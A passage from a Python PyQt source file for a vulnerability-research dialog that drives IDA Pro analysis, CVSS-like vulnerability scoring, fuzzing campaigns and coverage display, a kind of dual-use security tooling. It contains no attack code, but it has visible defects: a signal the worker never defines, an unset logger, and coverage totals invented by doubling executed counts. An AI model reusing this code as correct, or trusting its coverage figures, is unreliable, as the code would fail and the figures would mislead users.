                "severity": "high"
            })

    # Save results
    output_path = os.path.join(idaapi.get_input_file_path() + "_analysis.json")
    with open(output_path, 'w') as f:
        json.dump(results, f, indent=2)

    idaapi.qexit(0)

if __name__ == "__main__":
    analyze_binary()
'''

                with tempfile.TemporaryDirectory() as temp_dir:
                    script_path = os.path.join(temp_dir, "ida_analysis.py")
                    with open(script_path, 'w') as f:
                        f.write(ida_script)

                    # Run IDA Pro analysis
                    cmd = [
                        ida_path,
                        "-A",  # Auto analysis
                        "-S" + script_path,  # Script to run
                        target_path
                    ]

                    subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        cmd,
                        capture_output=True,
                        text=True,
                        timeout=600,
                        cwd=temp_dir,
                        shell=False
                    )

                    # Check for results file
                    results_file = target_path + "_analysis.json"
                    if os.path.exists(results_file):
                        with open(results_file, 'r') as f:
                            ida_results = json.load(f)

                        return ida_results.get('vulnerabilities', [])

                    return []

            except Exception as e:
                logger.error(f"IDA Pro integration failed: {e}")
                return []

        def _comprehensive_vulnerability_scoring(self, vulnerabilities):
            """Enhanced CVSS-like scoring for discovered vulnerabilities."""
            scored_vulns = []

            for vuln in vulnerabilities:
                # Base score metrics
                impact_score = self._calculate_impact_score(vuln)
                exploitability_score = self._calculate_exploitability_score(vuln)

                # Calculate base score (0-10)
                base_score = min(10.0, (impact_score + exploitability_score) / 2)

                # Environmental factors
                env_score = self._calculate_environmental_score(vuln)

                # Final CVSS-like score
                final_score = min(10.0, base_score + env_score)

                vuln['cvss_score'] = round(final_score, 1)
                vuln['impact_subscore'] = round(impact_score, 1)
                vuln['exploitability_subscore'] = round(exploitability_score, 1)
                vuln['severity_rating'] = self._score_to_severity(final_score)

                scored_vulns.append(vuln)

            return sorted(scored_vulns, key=lambda x: x['cvss_score'], reverse=True)

        def _calculate_impact_score(self, vuln):
            """Calculate impact score based on vulnerability type and characteristics."""
            base_impact = {
                "command_injection_risk": 9.0,
                "sql_injection_risk": 8.5,
                "buffer_overflow_risk": 8.0,
                "use_after_free_advanced": 7.5,
                "hardcoded_cryptographic_material": 7.0,
                "race_condition_risk": 6.5,
                "weak_cryptography_implementation": 6.0,
                "logic_flaw": 5.5,
                "information_disclosure": 4.0
            }.get(vuln.get('type', ''), 5.0)

            # Modifiers based on context
            if vuln.get('exploit_potential') == 'high':
                base_impact += 1.0
            elif vuln.get('exploit_potential') == 'low':
                base_impact -= 1.0

            # CWE-based modifiers
            critical_cwes = ['CWE-78', 'CWE-89', 'CWE-798']
            if vuln.get('cwe') in critical_cwes:
                base_impact += 0.5

            return min(10.0, max(0.0, base_impact))

        def _calculate_exploitability_score(self, vuln):
            """Calculate exploitability score based on attack complexity."""
            base_exploitability = {
                "command_injection_risk": 8.5,
                "sql_injection_risk": 8.0,
                "buffer_overflow_risk": 6.5,
                "format_string_vulnerability": 7.0,
                "race_condition_risk": 4.0,
                "logic_flaw": 5.5
            }.get(vuln.get('type', ''), 5.0)

            # Authentication requirement modifier
            if 'authentication' in vuln.get('description', '').lower():
                base_exploitability -= 2.0

            # Network accessibility (assume local for binary analysis)
            base_exploitability -= 1.0

            return min(10.0, max(0.0, base_exploitability))

        def _calculate_environmental_score(self, vuln):
            """Calculate environmental score modifier."""
            env_score = 0.0

            # Increase score for memory corruption in privileged context
            if vuln.get('type') in ['buffer_overflow_risk', 'use_after_free_advanced']:
                env_score += 0.5

            # Increase score for injection vulnerabilities
            if 'injection' in vuln.get('type', ''):
                env_score += 0.5

            return env_score

        def _score_to_severity(self, score):
            """Convert numerical score to severity rating."""
            if score >= 9.0:
                return "Critical"
            elif score >= 7.0:
                return "High"
            elif score >= 4.0:
                return "Medium"
            else:
                return "Low"


# Utility functions that use the imported components
def create_binary_differ(config=None):
    """Create a binary differ instance with configuration."""
    differ = BinaryDiffer()
    if config and hasattr(differ, "configure"):
        differ.configure(config)
    return differ


def create_fuzzing_engine(strategy=None, target_binary=None):
    """Create a fuzzing engine with specified strategy."""
    if strategy is None:
        strategy = FuzzingStrategy.MUTATION_BASED

    engine = FuzzingEngine()
    if hasattr(engine, "set_strategy"):
        engine.set_strategy(strategy)
    if target_binary and hasattr(engine, "set_target"):
        engine.set_target(target_binary)

    return engine


def get_available_analysis_methods():
    """Get list of available analysis methods."""
    methods = []
    if hasattr(AnalysisMethod, "STATIC"):
        methods.append(AnalysisMethod.STATIC)
    if hasattr(AnalysisMethod, "DYNAMIC"):
        methods.append(AnalysisMethod.DYNAMIC)
    if hasattr(AnalysisMethod, "SYMBOLIC"):
        methods.append(AnalysisMethod.SYMBOLIC)
    if hasattr(AnalysisMethod, "HYBRID"):
        methods.append(AnalysisMethod.HYBRID)
    return methods


def create_vulnerability_analyzer(method=None):
    """Create a vulnerability analyzer with specified method."""
    analyzer = VulnerabilityAnalyzer()
    if method and hasattr(analyzer, "set_method"):
        analyzer.set_method(method)
    return analyzer


def get_campaign_status_options():
    """Get available campaign status options."""
    statuses = []
    if hasattr(CampaignStatus, "PENDING"):
        statuses.append(CampaignStatus.PENDING)
    if hasattr(CampaignStatus, "RUNNING"):
        statuses.append(CampaignStatus.RUNNING)
    if hasattr(CampaignStatus, "COMPLETED"):
        statuses.append(CampaignStatus.COMPLETED)
    if hasattr(CampaignStatus, "FAILED"):
        statuses.append(CampaignStatus.FAILED)
    return statuses


class ResearchWorkerThread(QThread):
    """Background worker for research operations."""

    # Add signals for different research operations
    #: diff results (type: dict)
    binary_diff_completed = pyqtSignal(dict)
    #: status, progress (type: str, float)
    fuzzing_progress = pyqtSignal(str, float)
    #: method, results (type: str, dict)
    analysis_completed = pyqtSignal(str, dict)
    #: campaign_id, status (type: str, str)
    campaign_status_changed = pyqtSignal(str, str)

    #: campaign_id, status (type: str, dict)
    campaign_updated = pyqtSignal(str, dict)
    #: campaign_id, results (type: str, dict)
    results_ready = pyqtSignal(str, dict)
    #: operation, error_message (type: str, str)
    error_occurred = pyqtSignal(str, str)

    def __init__(self):
        """Initialize the research worker thread for vulnerability analysis operations."""
        super().__init__()
        self.research_manager = ResearchManager() if RESEARCH_AVAILABLE else None
        self.operation_queue = []
        self.running = True

    def add_operation(self, operation_type: str, **kwargs):
        """Add operation to processing queue."""
        self.operation_queue.append(
            {"type": operation_type, "args": kwargs, "timestamp": time.time()}
        )

    def run(self):
        """Main worker thread loop."""
        while self.running:
            if self.operation_queue:
                operation = self.operation_queue.pop(0)
                self._process_operation(operation)
            else:
                self.msleep(100)  # Sleep 100ms when idle

    def _process_operation(self, operation: dict[str, Any]):
        """Process a single operation."""
        try:
            op_type = operation["type"]
            args = operation["args"]

            if op_type == "create_campaign":
                self._create_campaign(**args)
            elif op_type == "start_campaign":
                self._start_campaign(**args)

        except Exception as e:
            self.logger.error("Exception in vulnerability_research_dialog: %s", e)
            self.error_occurred.emit(operation["type"], str(e))

    def _create_campaign(
        self,
        name: str,
        campaign_type: str,
        targets: list[str],
        template: str | None = None,
        config: dict | None = None,
    ):
        """Create research campaign."""
        if not self.research_manager:
            self.error_occurred.emit("create_campaign", "Research manager not available")
            return

        campaign_type_enum = CampaignType(campaign_type)
        result = self.research_manager.create_campaign(
            name=name,
            campaign_type=campaign_type_enum,
            targets=targets,
            template=template,
            custom_config=config,
        )

        if result["success"]:
            self.campaign_updated.emit(result["campaign_id"], result)
        else:
            self.error_occurred.emit("create_campaign", result.get("error", "Unknown error"))

    def _start_campaign(self, campaign_id: str):
        """Start research campaign."""
        if not self.research_manager:
            self.error_occurred.emit("start_campaign", "Research manager not available")
            return

        result = self.research_manager.start_campaign(campaign_id)

        if result["success"]:
            self.results_ready.emit(campaign_id, result["results"])
        else:
            self.error_occurred.emit("start_campaign", result.get("error", "Unknown error"))

    def stop(self):
        """Stop worker thread."""
        self.running = False


class VulnerabilityResearchDialog(QDialog):
    """Main dialog for vulnerability research and ML adaptation."""

    def __init__(self, parent=None):
        """Initialize the vulnerability research dialog with analysis engines and worker threads."""
        super().__init__(parent)
        self.setWindowTitle("Vulnerability Research")
        self.setMinimumSize(1400, 900)

        # Initialize components
        self.research_manager = ResearchManager() if RESEARCH_AVAILABLE else None

        # Active campaigns and results
        self.active_campaigns = {}
        self.campaign_results = {}

        # Worker thread
        self.worker = ResearchWorkerThread()
        self.worker.campaign_updated.connect(self._on_campaign_updated)
        self.worker.results_ready.connect(self._on_results_ready)
        self.worker.error_occurred.connect(self._on_error_occurred)
        self.worker.adaptation_complete.connect(self._on_adaptation_complete)
        self.worker.start()

        # Update timer
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self._update_campaign_status)
        self.update_timer.start(2000)  # Update every 2 seconds

        self._setup_ui()
        self._load_initial_data()

    def _setup_ui(self):
        """Setup user interface."""
        layout = QVBoxLayout(self)

        # Main tab widget
        self.tab_widget = QTabWidget()
        layout.addWidget(self.tab_widget)

        # Research campaigns tab
        self.campaigns_tab = self._create_campaigns_tab()
        self.tab_widget.addTab(self.campaigns_tab, "Research Campaigns")

        # Coverage visualization tab
        self.coverage_tab = self._create_coverage_tab()
        self.tab_widget.addTab(self.coverage_tab, "Coverage Analysis")

        # Results analysis tab
        self.results_tab = self._create_results_tab()
        self.tab_widget.addTab(self.results_tab, "Results & Analysis")

        # Configuration tab
        self.config_tab = self._create_configuration_tab()
        self.tab_widget.addTab(self.config_tab, "Configuration")

        # Button layout
        button_layout = QHBoxLayout()

        self.export_btn = QPushButton("Export Results")
        self.export_btn.clicked.connect(self._export_results)
        button_layout.addWidget(self.export_btn)

        button_layout.addStretch()

        self.close_btn = QPushButton("Close")
        self.close_btn.clicked.connect(self.close)
        button_layout.addWidget(self.close_btn)

        layout.addLayout(button_layout)

    def _create_campaigns_tab(self) -> QWidget:
        """Create research campaigns tab."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Campaign creation section
        creation_group = QGroupBox("Create New Campaign")
        creation_layout = QGridLayout(creation_group)

        # Campaign details
        creation_layout.addWidget(QLabel("Campaign Name:"), 0, 0)
        self.campaign_name_edit = QLineEdit()
        creation_layout.addWidget(self.campaign_name_edit, 0, 1)

        creation_layout.addWidget(QLabel("Campaign Type:"), 1, 0)
        self.campaign_type_combo = QComboBox()
        self.campaign_type_combo.addItems(
            [
                "Binary Analysis",
                "Fuzzing",
                "Vulnerability Assessment",
                "Patch Analysis",
                "Hybrid Research",
            ],
        )
        creation_layout.addWidget(self.campaign_type_combo, 1, 1)

        creation_layout.addWidget(QLabel("Template:"), 2, 0)
        self.template_combo = QComboBox()
        self.template_combo.addItems(
            ["None", "Basic Fuzzing", "Comprehensive Analysis", "Patch Research"]
        )
        creation_layout.addWidget(self.template_combo, 2, 1)

        # Target selection
        creation_layout.addWidget(QLabel("Targets:"), 3, 0)
        self.targets_edit = QTextEdit()
        self.targets_edit.setMaximumHeight(80)
        self.targets_edit.setPlaceholderText("Enter target files/directories (one per line)")
        creation_layout.addWidget(self.targets_edit, 3, 1)

        # Buttons
        button_layout = QHBoxLayout()

        self.browse_targets_btn = QPushButton("Browse Targets")
        self.browse_targets_btn.clicked.connect(self._browse_targets)
        button_layout.addWidget(self.browse_targets_btn)

        self.create_campaign_btn = QPushButton("Create Campaign")
        self.create_campaign_btn.clicked.connect(self._create_campaign)
        button_layout.addWidget(self.create_campaign_btn)

        creation_layout.addLayout(button_layout, 4, 0, 1, 2)

        layout.addWidget(creation_group)

        # Active campaigns section
        campaigns_group = QGroupBox("Active Campaigns")
        campaigns_layout = QVBoxLayout(campaigns_group)

        # Campaign list
        self.campaigns_tree = QTreeWidget()
        self.campaigns_tree.setHeaderLabels(
            ["Campaign", "Type", "Status", "Progress", "Targets", "Created"]
        )
        self.campaigns_tree.itemDoubleClicked.connect(self._show_campaign_details)
        campaigns_layout.addWidget(self.campaigns_tree)

        # Campaign controls
        controls_layout = QHBoxLayout()

        self.start_campaign_btn = QPushButton("Start")
        self.start_campaign_btn.clicked.connect(self._start_selected_campaign)
        controls_layout.addWidget(self.start_campaign_btn)

        self.pause_campaign_btn = QPushButton("Pause")
        self.pause_campaign_btn.clicked.connect(self._pause_selected_campaign)
        controls_layout.addWidget(self.pause_campaign_btn)

        self.cancel_campaign_btn = QPushButton("Cancel")
        self.cancel_campaign_btn.clicked.connect(self._cancel_selected_campaign)
        controls_layout.addWidget(self.cancel_campaign_btn)

        controls_layout.addStretch()

        self.refresh_campaigns_btn = QPushButton("Refresh")
        self.refresh_campaigns_btn.clicked.connect(self._refresh_campaigns)
        controls_layout.addWidget(self.refresh_campaigns_btn)

        campaigns_layout.addLayout(controls_layout)

        layout.addWidget(campaigns_group)

        return widget

    def _create_results_tab(self) -> QWidget:
        """Create results analysis tab."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Results splitter
        splitter = QSplitter(Qt.Horizontal)

        # Campaign results list
        results_group = QGroupBox("Campaign Results")
        results_layout = QVBoxLayout(results_group)

        self.results_tree = QTreeWidget()
        self.results_tree.setHeaderLabels(["Campaign", "Type", "Status", "Results", "Completed"])
        self.results_tree.itemSelectionChanged.connect(self._show_result_details)
        results_layout.addWidget(self.results_tree)

        splitter.addWidget(results_group)

        # Result details
        details_group = QGroupBox("Result Details")
        details_layout = QVBoxLayout(details_group)

        # Result tabs
        self.result_tabs = QTabWidget()

        # Summary tab
        self.summary_edit = QTextEdit()
        self.summary_edit.setReadOnly(True)
        self.result_tabs.addTab(self.summary_edit, "Summary")

        # Vulnerabilities tab
        self.vulnerabilities_table = QTableWidget(0, 5)
        self.vulnerabilities_table.setHorizontalHeaderLabels(
            ["Type", "Severity", "Location", "Exploitable", "Description"],
        )
        self.result_tabs.addTab(self.vulnerabilities_table, "Vulnerabilities")

        # Correlation tab
        self.correlation_edit = QTextEdit()
        self.correlation_edit.setReadOnly(True)
        self.result_tabs.addTab(self.correlation_edit, "Correlation")

        # Raw data tab
        self.raw_data_edit = QTextEdit()
        self.raw_data_edit.setReadOnly(True)
        self.result_tabs.addTab(self.raw_data_edit, "Raw Data")

        details_layout.addWidget(self.result_tabs)

        splitter.addWidget(details_group)

        layout.addWidget(splitter)

        # Analysis controls
        analysis_layout = QHBoxLayout()

        self.generate_report_btn = QPushButton("Generate Report")
        self.generate_report_btn.clicked.connect(self._generate_report)
        analysis_layout.addWidget(self.generate_report_btn)

        self.correlate_results_btn = QPushButton("Correlate Results")
        self.correlate_results_btn.clicked.connect(self._correlate_results)
        analysis_layout.addWidget(self.correlate_results_btn)

        analysis_layout.addStretch()

        layout.addLayout(analysis_layout)

        return widget

    def _create_coverage_tab(self) -> QWidget:
        """Create coverage analysis and visualization tab."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Coverage controls
        controls_group = QGroupBox("Coverage Analysis Controls")
        controls_layout = QHBoxLayout(controls_group)

        # Binary selection
        self.coverage_binary_edit = QLineEdit()
        self.coverage_binary_edit.setPlaceholderText("Select binary for coverage analysis...")
        controls_layout.addWidget(QLabel("Binary:"))
        controls_layout.addWidget(self.coverage_binary_edit)

        self.browse_binary_btn = QPushButton("Browse")
        self.browse_binary_btn.clicked.connect(self._browse_coverage_binary)
        controls_layout.addWidget(self.browse_binary_btn)

        # Test case directory
        self.test_cases_edit = QLineEdit()
        self.test_cases_edit.setPlaceholderText("Test cases directory...")
        controls_layout.addWidget(QLabel("Test Cases:"))
        controls_layout.addWidget(self.test_cases_edit)

        self.browse_tests_btn = QPushButton("Browse")
        self.browse_tests_btn.clicked.connect(self._browse_test_cases)
        controls_layout.addWidget(self.browse_tests_btn)

        # Analysis button
        self.analyze_coverage_btn = QPushButton("Analyze Coverage")
        self.analyze_coverage_btn.clicked.connect(self._analyze_coverage)
        controls_layout.addWidget(self.analyze_coverage_btn)

        layout.addWidget(controls_group)

        # Coverage visualization splitter
        splitter = QSplitter(Qt.Horizontal)

        # Left panel - Coverage overview
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)

        # Coverage summary
        summary_group = QGroupBox("Coverage Summary")
        summary_layout = QVBoxLayout(summary_group)

        self.coverage_summary_text = QTextEdit()
        self.coverage_summary_text.setMaximumHeight(150)
        self.coverage_summary_text.setReadOnly(True)
        summary_layout.addWidget(self.coverage_summary_text)

        left_layout.addWidget(summary_group)

        # Coverage metrics
        metrics_group = QGroupBox("Coverage Metrics")
        metrics_layout = QVBoxLayout(metrics_group)

        self.coverage_metrics_widget = self._create_coverage_metrics_widget()
        metrics_layout.addWidget(self.coverage_metrics_widget)

        left_layout.addWidget(metrics_group)

        # Hot/Cold spots
        spots_group = QGroupBox("Hot/Cold Spots")
        spots_layout = QVBoxLayout(spots_group)

        self.spots_tabs = QTabWidget()

        # Hot spots
        self.hot_spots_table = QTableWidget(0, 4)
        self.hot_spots_table.setHorizontalHeaderLabels(
            ["Function", "File", "Execution Count", "Complexity"]
        )
        self.spots_tabs.addTab(self.hot_spots_table, "Hot Spots")

        # Cold spots
        self.cold_spots_table = QTableWidget(0, 3)
        self.cold_spots_table.setHorizontalHeaderLabels(["Function", "File", "Status"])
        self.spots_tabs.addTab(self.cold_spots_table, "Cold Spots")

        spots_layout.addWidget(self.spots_tabs)
        left_layout.addWidget(spots_group)

        splitter.addWidget(left_panel)

        # Right panel - Detailed coverage
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)

        # File coverage
        file_coverage_group = QGroupBox("File Coverage Details")
        file_coverage_layout = QVBoxLayout(file_coverage_group)

        # File selector
        file_selector_layout = QHBoxLayout()
        file_selector_layout.addWidget(QLabel("File:"))

        self.file_coverage_combo = QComboBox()
        self.file_coverage_combo.currentTextChanged.connect(self._show_file_coverage)
        file_selector_layout.addWidget(self.file_coverage_combo)

        file_coverage_layout.addLayout(file_selector_layout)

        # Coverage display
        self.file_coverage_display = QTextEdit()
        self.file_coverage_display.setReadOnly(True)
        self.file_coverage_display.setFont(self._get_monospace_font())
        file_coverage_layout.addWidget(self.file_coverage_display)

        right_layout.addWidget(file_coverage_group)

        # Function coverage
        function_coverage_group = QGroupBox("Function Coverage")
        function_coverage_layout = QVBoxLayout(function_coverage_group)

        self.function_coverage_table = QTableWidget(0, 6)
        self.function_coverage_table.setHorizontalHeaderLabels(
            ["Function", "File", "Line", "Executed", "Count", "Complexity"],
        )
        function_coverage_layout.addWidget(self.function_coverage_table)

        right_layout.addWidget(function_coverage_group)

        splitter.addWidget(right_panel)
        layout.addWidget(splitter)

        # Export controls
        export_layout = QHBoxLayout()

        self.export_coverage_btn = QPushButton("Export Coverage Report")
        self.export_coverage_btn.clicked.connect(self._export_coverage_report)
        export_layout.addWidget(self.export_coverage_btn)

        self.export_viz_btn = QPushButton("Export Visualization")
        self.export_viz_btn.clicked.connect(self._export_coverage_visualization)
        export_layout.addWidget(self.export_viz_btn)

        export_layout.addStretch()

        layout.addLayout(export_layout)

        # Initialize with empty state
        self._clear_coverage_display()

        return widget

    def _create_coverage_metrics_widget(self) -> QWidget:
        """Create widget for displaying coverage metrics with progress bars."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Line coverage
        line_layout = QHBoxLayout()
        line_layout.addWidget(QLabel("Line Coverage:"))
        self.line_coverage_bar = self._create_progress_bar()
        self.line_coverage_label = QLabel("0%")
        line_layout.addWidget(self.line_coverage_bar)
        line_layout.addWidget(self.line_coverage_label)
        layout.addLayout(line_layout)

        # Function coverage
        function_layout = QHBoxLayout()
        function_layout.addWidget(QLabel("Function Coverage:"))
        self.function_coverage_bar = self._create_progress_bar()
        self.function_coverage_label = QLabel("0%")
        function_layout.addWidget(self.function_coverage_bar)
        function_layout.addWidget(self.function_coverage_label)
        layout.addLayout(function_layout)

        # Branch coverage
        branch_layout = QHBoxLayout()
        branch_layout.addWidget(QLabel("Branch Coverage:"))
        self.branch_coverage_bar = self._create_progress_bar()
        self.branch_coverage_label = QLabel("0%")
        branch_layout.addWidget(self.branch_coverage_bar)
        branch_layout.addWidget(self.branch_coverage_label)
        layout.addLayout(branch_layout)

        return widget

    def _create_progress_bar(self):
        """Create styled progress bar for coverage display."""
        progress_bar = QProgressBar()
        progress_bar.setRange(0, 100)
        progress_bar.setValue(0)
        progress_bar.setTextVisible(False)

        # Style the progress bar with color coding
        progress_bar.setObjectName("vulnerabilityScore")

        return progress_bar

    def _get_monospace_font(self):
        """Get monospace font for code display."""
        font = QFont()
        font.setFamily("Consolas, Monaco, monospace")
        font.setFixedPitch(True)
        font.setPointSize(10)
        return font

    def _browse_coverage_binary(self):
        """Browse for binary file to analyze coverage."""
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select Binary for Coverage Analysis",
            "",
            "Executable Files (*.exe *.elf);;All Files (*)",
        )
        if file_path:
            self.coverage_binary_edit.setText(file_path)

    def _browse_test_cases(self):
        """Browse for test cases directory."""
        dir_path = QFileDialog.getExistingDirectory(self, "Select Test Cases Directory")
        if dir_path:
            self.test_cases_edit.setText(dir_path)

    def _analyze_coverage(self):
        """Perform coverage analysis on selected binary and test cases."""
        binary_path = self.coverage_binary_edit.text().strip()
        test_cases_dir = self.test_cases_edit.text().strip()

        if not binary_path:
            QMessageBox.warning(self, "Warning", "Please select a binary file.")
            return

        if not test_cases_dir:
            QMessageBox.warning(self, "Warning", "Please select test cases directory.")
            return

        try:
            import os
            import tempfile

            # Create fuzzing engine for coverage analysis
            fuzzing_engine = FuzzingEngine()

            self.coverage_summary_text.append("Starting coverage analysis...")
            self.coverage_summary_text.append(f"Binary: {binary_path}")
            self.coverage_summary_text.append(f"Test cases: {test_cases_dir}")

            # Collect all test case files
            test_files = []
            for root, _dirs, files in os.walk(test_cases_dir):
                for file in files:
                    test_files.append(os.path.join(root, file))

            if not test_files:
                QMessageBox.warning(self, "Warning", "No test files found in directory.")
                return

            self.coverage_summary_text.append(f"Found {len(test_files)} test cases")

            # Analyze coverage for each test case
            all_coverage_data = []
            detailed_coverage = None

            with tempfile.TemporaryDirectory() as _:
                for i, test_file in enumerate(
                    test_files[:100]
                ):  # Limit to first 100 for performance
                    try:
                        coverage_data = fuzzing_engine._get_real_coverage(binary_path, test_file)
                        if coverage_data:
                            all_coverage_data.append(coverage_data)

                            # Use detailed coverage from first successful analysis
                            if coverage_data.get("detailed_coverage") and not detailed_coverage:
                                detailed_coverage = coverage_data["detailed_coverage"]

                        # Update progress
                        if (i + 1) % 10 == 0:
                            self.coverage_summary_text.append(
                                f"Processed {i + 1}/{min(len(test_files), 100)} test cases",
                            )
                            self.coverage_summary_text.repaint()

                    except Exception as e:
                        logger.debug(f"Coverage analysis failed for {test_file}: {e}")
                        continue

            if not all_coverage_data:
                QMessageBox.warning(self, "Warning", "No coverage data could be collected.")
                return

            # Aggregate coverage data
            aggregated_coverage = self._aggregate_coverage_data(all_coverage_data)

            # Use detailed coverage if available, otherwise use aggregated
            if detailed_coverage:
                self._display_coverage_results(detailed_coverage, aggregated_coverage)
            else:
                # Create basic coverage info from aggregated data
                basic_coverage = {
                    "summary": {
                        "executed_lines": aggregated_coverage.get("basic_blocks", 0),
                        "total_lines": aggregated_coverage.get("basic_blocks", 0) * 2,  # Estimate
                        "executed_functions": aggregated_coverage.get("functions", 0),
                        "total_functions": aggregated_coverage.get("functions", 0) * 2,  # Estimate
                        "taken_branches": aggregated_coverage.get("branches", 0),
                        "total_branches": aggregated_coverage.get("branches", 0) * 2,  # Estimate
                    },
                    "files": {},
                    "functions": [],
                    "hot_spots": [],
                    "cold_spots": [],
                }
                self._display_coverage_results(basic_coverage, aggregated_coverage)

            self.coverage_summary_text.append("Coverage analysis completed!")

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Coverage analysis failed: {e!s}")
            logger.error(f"Coverage analysis error: {e}")

    def _aggregate_coverage_data(self, coverage_data_list):
        """Aggregate coverage data from multiple test cases."""
        if not coverage_data_list:
            return {}

        # Find maximum coverage achieved across all test cases
        max_basic_blocks = max(data.get("basic_blocks", 0) for data in coverage_data_list)
        max_functions = max(data.get("functions", 0) for data in coverage_data_list)
        max_branches = max(data.get("branches", 0) for data in coverage_data_list)

        return {
            "basic_blocks": max_basic_blocks,
            "functions": max_functions,
            "branches": max_branches,
            "test_cases_analyzed": len(coverage_data_list),
        }

    def _display_coverage_results(self, detailed_coverage, aggregated_coverage):
        """Display coverage analysis results in the UI."""
        try:
            summary = detailed_coverage.get("summary", {})

            # Update summary text
            summary_text = f"""Coverage Analysis Results:

Total Lines: {summary.get('total_lines', 0)}
Executed Lines: {summary.get('executed_lines', 0)}
Line Coverage: {(summary.get('executed_lines', 0) / max(summary.get('total_lines', 1), 1) * 100):.1f}%

Total Functions: {summary.get('total_functions', 0)}
Executed Functions: {summary.get('executed_functions', 0)}
Function Coverage: {(summary.get('executed_functions', 0) / max(summary.get('total_functions', 1), 1) * 100):.1f}%

Total Branches: {summary.get('total_branches', 0)}
Taken Branches: {summary.get('taken_branches', 0)}
Branch Coverage: {(summary.get('taken_branches', 0) / max(summary.get('total_branches', 1), 1) * 100):.1f}%

Test Cases Analyzed: {aggregated_coverage.get('test_cases_analyzed', 0)}
"""

            self.coverage_summary_text.clear()
            self.coverage_summary_text.append(summary_text)

            # Update progress bars
            line_coverage_pct = (
                summary.get("executed_lines", 0) / max(summary.get("total_lines", 1), 1) * 100
            )
            function_coverage_pct = (
                summary.get("executed_functions", 0)
                / max(summary.get("total_functions", 1), 1)
                * 100
            )
            branch_coverage_pct = (
                summary.get("taken_branches", 0) / max(summary.get("total_branches", 1), 1) * 100
            )

            self.line_coverage_bar.setValue(int(line_coverage_pct))
            self.line_coverage_label.setText(f"{line_coverage_pct:.1f}%")

            self.function_coverage_bar.setValue(int(function_coverage_pct))
            self.function_coverage_label.setText(f"{function_coverage_pct:.1f}%")

            self.branch_coverage_bar.setValue(int(branch_coverage_pct))
            self.branch_coverage_label.setText(f"{branch_coverage_pct:.1f}%")

            # Update hot spots table
            self._update_hot_spots_table(detailed_coverage.get("hot_spots", []))

            # Update cold spots table
            self._update_cold_spots_table(detailed_coverage.get("cold_spots", []))

            # Update file coverage combo
            self._update_file_coverage_combo(detailed_coverage.get("files", {}))

            # Update function coverage table
            self._update_function_coverage_table(detailed_coverage.get("functions", []))

        except Exception as e:
            logger.error(f"Failed to display coverage results: {e}")

    def _update_hot_spots_table(self, hot_spots):
        """Update hot spots table with execution data."""
        self.hot_spots_table.setRowCount(len(hot_spots))

        for row, spot in enumerate(hot_spots):
            self.hot_spots_table.setItem(row, 0, QTableWidgetItem(spot.get("name", "Unknown")))
            self.hot_spots_table.setItem(row, 1, QTableWidgetItem(spot.get("file", "Unknown")))
            self.hot_spots_table.setItem(
                row, 2, QTableWidgetItem(str(spot.get("execution_count", 0)))
            )
            self.hot_spots_table.setItem(row, 3, QTableWidgetItem(str(spot.get("complexity", 1))))

    def _update_cold_spots_table(self, cold_spots):
        """Update cold spots table with unexecuted functions."""
        self.cold_spots_table.setRowCount(len(cold_spots))

        for row, spot in enumerate(cold_spots):
            self.cold_spots_table.setItem(row, 0, QTableWidgetItem(spot.get("name", "Unknown")))
            self.cold_spots_table.setItem(row, 1, QTableWidgetItem(spot.get("file", "Unknown")))
            status = "Never executed" if not spot.get("executed") else "Rarely executed"
            self.cold_spots_table.setItem(row, 2, QTableWidgetItem(status))

    def _update_file_coverage_combo(self, files_data):
        """Update file coverage combo box."""
        self.file_coverage_combo.clear()
        for filename in files_data.keys():
            self.file_coverage_combo.addItem(filename)

    def _update_function_coverage_table(self, functions_data):
        """Update function coverage table."""
        self.function_coverage_table.setRowCount(len(functions_data))

        for row, func in enumerate(functions_data):
            self.function_coverage_table.setItem(
                row, 0, QTableWidgetItem(func.get("name", "Unknown"))
            )
            self.function_coverage_table.setItem(
                row, 1, QTableWidgetItem(func.get("file", "Unknown"))
            )
            self.function_coverage_table.setItem(row, 2, QTableWidgetItem(str(func.get("line", 0))))
            self.function_coverage_table.setItem(
                row, 3, QTableWidgetItem("Yes" if func.get("executed") else "No")
            )
            self.function_coverage_table.setItem(
                row, 4, QTableWidgetItem(str(func.get("execution_count", 0)))
            )
            self.function_coverage_table.setItem(
                row, 5, QTableWidgetItem(str(func.get("complexity", 1)))
            )

    def _show_file_coverage(self, filename):
        """Show detailed coverage for selected file."""
        if not filename:
            return

        try:
            # Get coverage data for the file
            coverage_data = getattr(self, "_last_coverage_data", {})
            file_coverage = coverage_data.get("file_coverage", {}).get(filename, {})

            # Read the source file
            source_lines = []
            try:
                with open(filename, encoding="utf-8", errors="ignore") as f:
                    source_lines = f.readlines()
            except Exception as e:
                logger.error(f"Failed to read source file {filename}: {e}")
                self.file_coverage_display.setText(f"Error reading file: {filename}\n{e!s}")
                return

            # Build coverage display with line numbers and execution counts
            coverage_text = f"Detailed coverage for {filename}:\n"
            coverage_text += f"Total lines: {len(source_lines)}\n"

            executed_lines = file_coverage.get("executed_lines", set())
            executable_lines = file_coverage.get("executable_lines", set())
            execution_counts = file_coverage.get("execution_counts", {})

            if executable_lines:
                coverage_pct = (len(executed_lines) / len(executable_lines)) * 100
                coverage_text += f"Coverage: {coverage_pct:.1f}% ({len(executed_lines)}/{len(executable_lines)} lines)\n"

            coverage_text += "\n" + "=" * 80 + "\n\n"

            # Display each line with coverage info
            for i, line in enumerate(source_lines, 1):
                line = line.rstrip()

                # Determine line status
                if i in executed_lines:
                    count = execution_counts.get(i, 1)
                    prefix = f" {count:4d}x"
                elif i in executable_lines:
                    prefix = "     "
                else:
                    prefix = "      "

                # Format line
                coverage_text += f"{i:5d} {prefix} | {line}\n"

                # Add branch coverage info if available
                branch_info = file_coverage.get("branch_coverage", {}).get(i)
                if branch_info:
                    taken = branch_info.get("taken", 0)
                    total = branch_info.get("total", 0)
                    coverage_text += f"      Branch: {taken}/{total} paths taken\n"

            self.file_coverage_display.setText(coverage_text)

        except Exception as e:
            logger.error(f"Failed to display file coverage: {e}")
